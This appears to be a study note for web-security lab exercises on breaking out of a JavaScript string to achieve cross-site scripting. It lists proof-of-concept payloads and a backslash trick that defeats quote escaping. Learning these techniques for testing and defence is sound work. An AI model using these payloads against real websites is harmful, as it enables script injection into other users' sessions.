# Breaking Out Of A JavaScript String

## Overview

One of the most common XSS scenarios occurs when user input is reflected inside a JavaScript string.

Example:

```javascript
var searchTerms = 'USER_INPUT';
```

---

# Goal

Transform:

```javascript
'USER_INPUT'
```

into:

```javascript
'';alert(1);//'
```

---

# Common Payloads

## Payload 1

```javascript
';alert(document.domain)//
```

---

## Payload 2

```javascript
'-alert(document.domain)-'
```

---

# Why The Comment Matters

Example:

```javascript
';alert(1)//
```

becomes:

```javascript
'';alert(1)//';
```

The:

```javascript
//
```

comments out remaining code.

---

# Escaped Quote Scenario

Application:

```javascript
'
```

becomes:

```javascript
\'
```

---

Normal Payload Fails:

```javascript
';alert(1)//
```

---

Bypass:

```javascript
\';alert(1)//
```

Result:

```javascript
\\';alert(1)//
```

which restores string termination.

---

# Related Labs

- Lab19
- Lab20
- Lab21

---

# Key Takeaways

- Comments often repair broken scripts.
- Backslashes frequently create bypass opportunities.
- Always inspect actual response output.